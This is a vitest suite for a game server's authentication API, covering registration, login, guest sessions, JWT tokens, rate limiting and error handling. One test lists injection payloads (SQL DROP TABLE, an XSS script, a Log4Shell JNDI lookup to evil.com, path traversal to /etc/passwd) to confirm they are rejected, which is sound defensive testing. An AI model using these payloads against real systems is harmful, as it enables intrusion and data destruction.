/**
 * Phase 1 MVP Authentication System Tests
 * 
 * Tests for:
 * - User registration (username, email, password validation)
 * - User login (credentials validation, JWT generation)
 * - Anonymous sessions (guest account creation)
 * - JWT token management (generation, validation, refresh)
 * - Password security (hashing, strength validation)
 * - Session management (creation, validation, cleanup)
 * - Rate limiting and security features
 * - API endpoint validation and error handling
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll, vi } from 'vitest';
import request from 'supertest';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { app } from '../server.js';
import { PlayerService } from '../services/playerService.js';
import { SessionService } from '../services/sessionService.js';
import { db } from '../services/database.js';
import { redis } from '../services/redis.js';

describe('Phase 1 MVP - Authentication System', () => {
  let playerService: PlayerService;
  let sessionService: SessionService;
  
  beforeAll(async () => {
    // Initialize services
    playerService = new PlayerService();
    sessionService = new SessionService();
    
    // Connect to test databases
    await redis.connect();
    
    // Wait for connections
    await new Promise(resolve => setTimeout(resolve, 100));
  });

  afterAll(async () => {
    // Cleanup connections
    await redis.disconnect();
  });

  beforeEach(async () => {
    // Clear test data before each test
    await redis.delete('test:*');
    
    // Clear any existing rate limiting
    await redis.delete('ratelimit:*');
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('User Registration', () => {
    it('should register a new user with valid credentials', async () => {
      const userData = {
        username: 'testuser',
        email: 'test@example.com',
        password: 'SecurePassword123!',
        confirmPassword: 'SecurePassword123!'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(userData)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.token).toBeDefined();
      expect(response.body.player).toMatchObject({
        username: 'testuser',
        isAnonymous: false
      });
      expect(response.body.player.id).toBeDefined();
    });

    it('should validate username requirements', async () => {
      const invalidUsernames = ['ab', 'a'.repeat(51), 'user@name', 'user name'];

      for (const username of invalidUsernames) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username,
            email: 'test@example.com',
            password: 'SecurePassword123!',
            confirmPassword: 'SecurePassword123!'
          })
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Validation failed');
      }
    });

    it('should validate email format', async () => {
      const invalidEmails = ['notanemail', 'test@', '@example.com', 'test..test@example.com'];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: 'testuser',
            email,
            password: 'SecurePassword123!',
            confirmPassword: 'SecurePassword123!'
          })
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Validation failed');
      }
    });

    it('should validate password strength requirements', async () => {
      const weakPasswords = ['12345678', 'password', 'PASSWORD', 'Password', 'Pass123'];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: 'testuser',
            email: 'test@example.com',
            password,
            confirmPassword: password
          })
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Validation failed');
      }
    });

    it('should validate password confirmation match', async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          username: 'testuser',
          email: 'test@example.com',
          password: 'SecurePassword123!',
          confirmPassword: 'DifferentPassword123!'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Validation failed');
    });

    it('should prevent duplicate username registration', async () => {
      const userData = {
        username: 'testuser',
        email: 'test1@example.com',
        password: 'SecurePassword123!',
        confirmPassword: 'SecurePassword123!'
      };

      // First registration should succeed
      await request(app)
        .post('/api/auth/register')
        .send(userData)
        .expect(201);

      // Second registration with same username should fail
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          ...userData,
          email: 'test2@example.com'
        })
        .expect(409);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Username already taken');
    });

    it('should prevent duplicate email registration', async () => {
      const userData = {
        username: 'testuser1',
        email: 'test@example.com',
        password: 'SecurePassword123!',
        confirmPassword: 'SecurePassword123!'
      };

      // First registration should succeed
      await request(app)
        .post('/api/auth/register')
        .send(userData)
        .expect(201);

      // Second registration with same email should fail
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          ...userData,
          username: 'testuser2'
        })
        .expect(409);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Email already registered');
    });

    it('should hash passwords before storage', async () => {
      const userData = {
        username: 'testuser',
        email: 'test@example.com',
        password: 'SecurePassword123!',
        confirmPassword: 'SecurePassword123!'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(userData)
        .expect(201);

      // Verify password is hashed
      const player = await playerService.findPlayerByUsername('testuser');
      expect(player).toBeDefined();
      expect(player?.password_hash).toBeDefined();
      expect(player?.password_hash).not.toBe(userData.password);
      
      // Verify hash can be verified
      const isValid = await bcrypt.compare(userData.password, player!.password_hash);
      expect(isValid).toBe(true);
    });

    it('should apply rate limiting to registration attempts', async () => {
      const userData = {
        username: 'testuser',
        email: 'test@example.com',
        password: 'SecurePassword123!',
        confirmPassword: 'SecurePassword123!'
      };

      // Make multiple rapid registration attempts
      const requests = Array(6).fill(null).map((_, i) => 
        request(app)
          .post('/api/auth/register')
          .send({
            ...userData,
            username: `testuser${i}`,
            email: `test${i}@example.com`
          })
      );

      const responses = await Promise.all(requests);

      // Should have some rate limited responses
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('User Login', () => {
    beforeEach(async () => {
      // Create a test user for login tests
      await request(app)
        .post('/api/auth/register')
        .send({
          username: 'loginuser',
          email: 'login@example.com',
          password: 'LoginPassword123!',
          confirmPassword: 'LoginPassword123!'
        });
    });

    it('should login user with valid credentials', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'loginuser',
          password: 'LoginPassword123!'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.token).toBeDefined();
      expect(response.body.player).toMatchObject({
        username: 'loginuser',
        isAnonymous: false
      });
    });

    it('should reject login with invalid username', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'nonexistentuser',
          password: 'LoginPassword123!'
        })
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid credentials');
    });

    it('should reject login with invalid password', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'loginuser',
          password: 'WrongPassword123!'
        })
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid credentials');
    });

    it('should validate required login fields', async () => {
      // Missing username
      let response = await request(app)
        .post('/api/auth/login')
        .send({
          password: 'LoginPassword123!'
        })
        .expect(400);

      expect(response.body.success).toBe(false);

      // Missing password
      response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'loginuser'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
    });

    it('should apply stricter rate limiting to login attempts', async () => {
      const loginData = {
        username: 'loginuser',
        password: 'WrongPassword123!'
      };

      // Make multiple rapid login attempts with wrong password
      const requests = Array(4).fill(null).map(() => 
        request(app)
          .post('/api/auth/login')
          .send(loginData)
      );

      const responses = await Promise.all(requests);

      // Should have some rate limited responses (stricter than registration)
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Anonymous Sessions', () => {
    it('should create anonymous session with valid guest account', async () => {
      const response = await request(app)
        .post('/api/auth/anonymous')
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.token).toBeDefined();
      expect(response.body.player).toMatchObject({
        isAnonymous: true
      });
      expect(response.body.player.username).toMatch(/^Guest_/);
      expect(response.body.player.id).toBeDefined();
    });

    it('should generate unique guest usernames', async () => {
      const responses = await Promise.all([
        request(app).post('/api/auth/anonymous'),
        request(app).post('/api/auth/anonymous'),
        request(app).post('/api/auth/anonymous')
      ]);

      const usernames = responses.map(r => r.body.player.username);
      const uniqueUsernames = new Set(usernames);
      
      expect(uniqueUsernames.size).toBe(3);
      usernames.forEach(username => {
        expect(username).toMatch(/^Guest_/);
      });
    });

    it('should apply rate limiting to anonymous session creation', async () => {
      // Make multiple rapid anonymous session requests
      const requests = Array(12).fill(null).map(() => 
        request(app).post('/api/auth/anonymous')
      );

      const responses = await Promise.all(requests);

      // Should have some rate limited responses
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should create anonymous players with default stats', async () => {
      const response = await request(app)
        .post('/api/auth/anonymous')
        .expect(201);

      const playerId = response.body.player.id;
      const player = await playerService.findPlayerById(playerId);
      
      expect(player).toBeDefined();
      expect(player?.isAnonymous).toBe(true);
      expect(player?.rating).toBe(1000); // Default rating
    });
  });

  describe('JWT Token Management', () => {
    let testToken: string;
    let testPlayer: any;

    beforeEach(async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          username: 'tokenuser',
          email: 'token@example.com',
          password: 'TokenPassword123!',
          confirmPassword: 'TokenPassword123!'
        });
      
      testToken = response.body.token;
      testPlayer = response.body.player;
    });

    it('should generate valid JWT tokens with correct payload', () => {
      const decoded = jwt.verify(testToken, process.env.JWT_SECRET || 'default-secret') as any;
      
      expect(decoded.id).toBe(testPlayer.id);
      expect(decoded.username).toBe(testPlayer.username);
      expect(decoded.isAnonymous).toBe(testPlayer.isAnonymous);
      expect(decoded.rating).toBe(testPlayer.rating);
      expect(decoded.exp).toBeDefined();
      expect(decoded.iat).toBeDefined();
    });

    it('should validate tokens on protected routes', async () => {
      const response = await request(app)
        .get('/api/player/profile')
        .set('Authorization', `Bearer ${testToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.username).toBe('tokenuser');
    });

    it('should reject invalid tokens', async () => {
      const invalidToken = 'invalid.jwt.token';

      const response = await request(app)
        .get('/api/player/profile')
        .set('Authorization', `Bearer ${invalidToken}`)
        .expect(403);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Authentication failed');
    });

    it('should reject expired tokens', async () => {
      // Create an expired token
      const expiredToken = jwt.sign(
        {
          id: testPlayer.id,
          username: testPlayer.username,
          isAnonymous: testPlayer.isAnonymous,
          rating: testPlayer.rating
        },
        process.env.JWT_SECRET || 'default-secret',
        { expiresIn: '-1h' } // Expired 1 hour ago
      );

      const response = await request(app)
        .get('/api/player/profile')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(403);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Authentication failed');
    });

    it('should refresh tokens successfully', async () => {
      const response = await request(app)
        .post('/api/auth/refresh')
        .set('Authorization', `Bearer ${testToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.token).toBeDefined();
      expect(response.body.token).not.toBe(testToken); // Should be a new token
      expect(response.body.player.username).toBe('tokenuser');
    });

    it('should get current user with valid token', async () => {
      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${testToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.player).toMatchObject({
        username: 'tokenuser',
        isAnonymous: false
      });
    });
  });

  describe('Session Management', () => {
    it('should create and validate sessions properly', async () => {
      const testUser = {
        id: 'test-user-id',
        username: 'sessionuser',
        isAnonymous: false,
        rating: 1000
      };

      const { token, expiresAt } = await sessionService.createSession(
        testUser,
        '192.168.1.1',
        'test-user-agent'
      );

      expect(token).toBeDefined();
      expect(expiresAt).toBeInstanceOf(Date);
      expect(expiresAt.getTime()).toBeGreaterThan(Date.now());

      // Validate the session
      const validatedUser = await sessionService.validateSession(token, '192.168.1.1');
      expect(validatedUser).toMatchObject({
        id: testUser.id,
        username: testUser.username,
        isAnonymous: testUser.isAnonymous
      });
    });

    it('should invalidate expired sessions', async () => {
      const testUser = {
        id: 'test-user-id',
        username: 'sessionuser',
        isAnonymous: false,
        rating: 1000
      };

      // Create a session with very short expiry
      const shortExpiryToken = jwt.sign(
        testUser,
        process.env.JWT_SECRET || 'default-secret',
        { expiresIn: '1ms' }
      );

      // Wait for expiry
      await new Promise(resolve => setTimeout(resolve, 10));

      const validatedUser = await sessionService.validateSession(shortExpiryToken);
      expect(validatedUser).toBeNull();
    });

    it('should handle session validation correctly', async () => {
      const testUser = {
        id: 'test-user-id',
        username: 'sessionuser',
        isAnonymous: false,
        rating: 1000
      };

      const { token } = await sessionService.createSession(testUser);
      
      // Session should exist initially
      const validatedUser = await sessionService.validateSession(token);
      expect(validatedUser).toBeDefined();
      expect(validatedUser?.username).toBe('sessionuser');
    });
  });

  describe('Security and Error Handling', () => {
    it('should handle database connection failures gracefully', async () => {
      // Mock database failure for this test
      const originalQuery = db.query;
      db.query = vi.fn().mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app)
        .post('/api/auth/register')
        .send({
          username: 'testuser',
          email: 'test@example.com',
          password: 'SecurePassword123!',
          confirmPassword: 'SecurePassword123!'
        })
        .expect(500);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Registration failed');

      // Restore original function
      db.query = originalQuery;
    });

    it('should sanitize input to prevent injection attacks', async () => {
      const maliciousInputs = [
        "'; DROP TABLE players; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../etc/passwd'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: maliciousInput,
            email: 'test@example.com',
            password: 'SecurePassword123!',
            confirmPassword: 'SecurePassword123!'
          });

        // Should either reject invalid input or safely handle it
        expect([400, 500]).toContain(response.status);
      }
    });

    it('should log security events for audit purposes', async () => {
      const consoleSpy = vi.spyOn(console, 'log');

      // Attempt login with wrong credentials
      await request(app)
        .post('/api/auth/login')
        .send({
          username: 'nonexistent',
          password: 'WrongPassword123!'
        });

      // Should have logged the security event
      expect(consoleSpy).toHaveBeenCalled();
      
      consoleSpy.mockRestore();
    });

    it('should handle missing environment variables gracefully', async () => {
      const originalSecret = process.env.JWT_SECRET;
      delete process.env.JWT_SECRET;

      const response = await request(app)
        .post('/api/auth/register')
        .send({
          username: 'testuser',
          email: 'test@example.com',
          password: 'SecurePassword123!',
          confirmPassword: 'SecurePassword123!'
        });

      // Should still work with default secret
      expect([201, 500]).toContain(response.status);

      // Restore environment variable
      process.env.JWT_SECRET = originalSecret;
    });
  });

  describe('API Response Consistency', () => {
    it('should have consistent response format for all auth endpoints', async () => {
      const endpoints = [
        { method: 'post', path: '/api/auth/register', data: {
          username: 'testuser',
          email: 'test@example.com',
          password: 'SecurePassword123!',
          confirmPassword: 'SecurePassword123!'
        }},
        { method: 'post', path: '/api/auth/login', data: {
          username: 'nonexistent',
          password: 'wrong'
        }},
        { method: 'post', path: '/api/auth/anonymous', data: {} }
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)
          [endpoint.method](endpoint.path)
          .send(endpoint.data);

        // All responses should have consistent structure
        expect(response.body).toHaveProperty('success');
        expect(typeof response.body.success).toBe('boolean');
        
        if (response.body.success) {
          expect(response.body).toHaveProperty('token');
          expect(response.body).toHaveProperty('player');
        } else {
          expect(response.body).toHaveProperty('error');
          expect(typeof response.body.error).toBe('string');
        }
      }
    });

    it('should include timestamps in responses', async () => {
      const response = await request(app)
        .post('/api/auth/anonymous')
        .expect(201);

      expect(response.body).toHaveProperty('timestamp');
      expect(typeof response.body.timestamp).toBe('number');
      expect(response.body.timestamp).toBeLessThanOrEqual(Date.now());
    });
  });
}); 